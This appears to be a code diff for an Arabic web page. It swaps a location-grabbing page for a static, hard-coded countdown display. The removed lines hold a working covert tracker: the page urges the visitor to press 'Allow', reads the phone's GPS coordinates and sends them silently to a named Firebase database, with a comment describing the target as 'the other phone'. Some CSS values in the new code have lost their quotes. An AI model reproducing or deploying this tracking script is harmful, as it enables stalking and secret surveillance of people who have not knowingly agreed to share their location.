@@ -1,32 +1,150 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحديد الموقع</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عداد مخصص</title>
+    <style>
+        /* إعدادات الخلفية العامة وتوسيط العداد */
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-content: center;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* عنوان العداد العلوي */
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 40px;
+            letter-spacing: 1px;
+        }
+
+        /* حاوية العداد الرئيسي */
+        .countdown-container {
+            display: flex;
+            gap: 15px;
+            align-items: flex-start;
+        }
+
+        /* المجموعات الزمنية (البطاقات + الكلمة تحتها) */
+        .time-group {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* حاوية الأرقام لجمع الخانات معاً */
+        .digits-wrapper {
+            display: flex;
+            gap: 2px;
+        }
+
+        /* تصميم بطاقة الرقم المفرد (تأثير القلّاب الداكن) */
+        .digit-card {
+            background: linear-gradient(to bottom, #2c2c2c 50%, #222222 50%);
+            border: 1px solid #1a1a1a;
+            border-radius: 6px;
+            width: 32px;
+            height: 55px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: bold;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+
+        /* الخط الأفقي الوهمي في منتصف البطاقة ليحاكي الفاصل */
+        .digit-card::after {
+            content:   ;
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 100%;
+            height: 1px;
+            background-color: rgba(0, 0, 0, 0.4);
+        }
+
+        /* النقطتان الفاصلتان بين المجموعات (:) */
+        .separator {
+            font-size: 32px;
+            font-weight: bold;
+            height: 55px;
+            display: flex;
+            align-items: center;
+            color: #888888;
+        }
+
+        /* نصوص التسمية السفلية (يوم، ساعة، دقيقة، ثانية) */
+        .label {
+            font-size: 14px;
+            color: #b3b3b3;
+        }
+    </style>
 </head>
 <body>
-    <h2 style="text-align: center; margin-top: 50px;">جاري تحديد الموقع... يرجى الضغط على "سماح" إذا ظهرت لك</h2>
 
-    <script>
-        // دالة التقاط موقع الـ GPS من الهاتف الآخر
-        navigator.geolocation.getCurrentPosition(function(position) {
-            let lat = position.coords.latitude;
-            let lng = position.coords.longitude;
+    <!-- النص العلوي، يمكنك تعديله لأي تاريخ تريده -->
+    <div class="title">يوم 5 يوليو 2025 م</div>
 
-            // استبدل الرابط أدناه برابط الـ Realtime Database الخاص بك في Firebase
-            let firebaseURL = "https://srsr-9824a-default-rtdb.firebaseio.com/location.json";
-            // إرسال الإحداثيات فوراً إلى قاعدة البيانات
-            fetch(firebaseURL, {
-                method: "PUT",
-                body: JSON.stringify({ latitude: lat, longitude: lng })
-            })
-            .then(response => alert("تمت العملية بنجاح! شكراً لك."))
-            .catch(error => alert("حدث خطأ في الإرسال"));
+    <div class="countdown-container">
+        
+        <!-- قسم الأيام (3 خانات ليتسع لـ 071) -->
+        <div class="time-group">
+            <div class="digits-wrapper">
+                <div class="digit-card">0</div>
+                <div class="digit-card">7</div>
+                <div class="digit-card">1</div>
+            </div>
+            <div class="label">يوم</div>
+        </div>
 
-        }, function(error) {
-            alert("يرجى تفعيل الـ GPS في هاتفك والسماح للمتصفح بالوصول للموقع");
-        });
-    </script>
+        <div class="separator">:</div>
+
+        <!-- قسم الساعات -->
+        <div class="time-group">
+            <div class="digits-wrapper">
+                <div class="digit-card">0</div>
+                <div class="digit-card">7</div>
+            </div>
+            <div class="label">ساعة</div>
+        </div>
+
+        <div class="separator">:</div>
+
+        <!-- قسم الدقائق -->
+        <div class="time-group">
+            <div class="digits-wrapper">
+                <div class="digit-card">4</div>
+                <div class="digit-card">3</div>
+            </div>
+            <div class="label">دقيقة</div>
+        </div>
+
+        <div class="separator">:</div>
+
+        <!-- قسم الثواني -->
+        <div class="time-group">
+            <div class="digits-wrapper">
+                <div class="digit-card">3</div>
+                <div class="digit-card">8</div>
+            </div>
+            <div class="label">ثانية</div>
+        </div>
+
+    </div>
+
 </body>
 </html>
 
